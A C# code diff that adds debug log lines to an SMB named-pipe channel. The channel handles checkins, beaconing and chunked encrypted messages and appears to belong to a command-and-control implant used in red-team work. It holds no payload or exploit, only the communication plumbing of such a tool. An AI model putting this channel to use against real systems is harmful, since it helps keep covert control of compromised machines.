@@ -46,6 +46,7 @@ namespace Workflow.Channels
                 SmbChannelOptionsJsonContext.Default.SmbChannelOptions);
 
             this.pipeName = opts.PipeName;
+            DebugLog.Log($"SMB pipe name: {this.pipeName}");
 
             this.serverPipe = new PipeServer<SmbMessage>(this.pipeName);
             if (OperatingSystem.IsWindows())
@@ -61,18 +62,22 @@ namespace Workflow.Channels
             this.serverPipe.ClientDisconnected += async (o, args) => await OnClientDisconnect();
             this.serverPipe.MessageReceived += async (sender, args) => await OnMessageReceive(args);
             this.serverPipe.StartAsync(this.cancellationTokenSource.Token);
+            DebugLog.Log("SMB server pipe started");
         }
 
         public async Task<CheckinResponse> Checkin(Checkin checkin)
         {
             //Write our checkin message to the pipe
+            DebugLog.Log("SMB sending checkin");
             await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
 
             //Wait for a checkin response message
+            DebugLog.Log("SMB waiting for checkin response");
             checkinAvailable.Wait();
 
             //We got a checkin response, so let's finish the checkin process
             this.checkedin = true;
+            DebugLog.Log("SMB checkin complete");
             return this.cir;
         }
 
@@ -90,15 +95,18 @@ namespace Workflow.Channels
 
                 try
                 {
+                    DebugLog.Log("SMB beacon sending responses");
                     await this.Send(messageManager.GetAgentResponseString());
                 }
                 catch (Exception e)
                 {
                     this.currentAttempt++;
+                    DebugLog.Log($"SMB beacon send failed, attempt {this.currentAttempt}/{this.maxAttempts}");
                 }
 
                 if (this.currentAttempt >= this.maxAttempts)
                 {
+                    DebugLog.Log("SMB beacon max attempts reached, cancelling");
                     this.cancellationTokenSource.Cancel();
                 }
             }
@@ -107,9 +115,11 @@ namespace Workflow.Channels
         {
             if (!connected)
             {
+                DebugLog.Log("SMB Send waiting for client connection");
                 onClientConnectedSignal.WaitOne();
             }
 
+            DebugLog.Log($"SMB Send ({json.Length} bytes before encryption)");
             try
             {
                 json = this.crypt.Encrypt(json);
@@ -122,6 +132,7 @@ namespace Workflow.Channels
                 };
 
                 IEnumerable<string> parts = json.SplitByLength(4000);
+                DebugLog.Log($"SMB Send chunking into {parts.Count()} parts");
 
                 foreach (string part in parts)
                 {
@@ -169,6 +180,7 @@ namespace Workflow.Channels
             //Event handler for new messages
             try
             {
+                DebugLog.Log($"SMB message received, type: {args.Message.message_type}");
                 if (args.Message.message_type == "success")
                 {
                     return;
@@ -177,9 +189,11 @@ namespace Workflow.Channels
                 this.partialMessages.TryAdd(args.Message.guid, new StringBuilder()); //Either Add the key or it already exists
 
                 this.partialMessages[args.Message.guid].Append(args.Message.delegate_message);
+                DebugLog.Log($"SMB partial message tracked for {args.Message.guid}, final: {args.Message.final}");
 
                 if (args.Message.final)
                 {
+                    DebugLog.Log("SMB message complete, processing");
                     this.OnMessageReceiveComplete(this.partialMessages[args.Message.guid].ToString());
                     this.partialMessages.TryRemove(args.Message.guid, out _);
                 }
@@ -193,6 +207,7 @@ namespace Workflow.Channels
 
         private async Task OnClientConnection()
         {
+            DebugLog.Log("SMB client connected");
             onClientConnectedSignal.Set();
             this.connected = true;
             await this.SendUpdate();
@@ -200,6 +215,7 @@ namespace Workflow.Channels
 
         private async Task OnClientDisconnect()
         {
+            DebugLog.Log("SMB client disconnected");
             this.connected = false;
             onClientConnectedSignal.Reset();
             this.partialMessages.Clear();
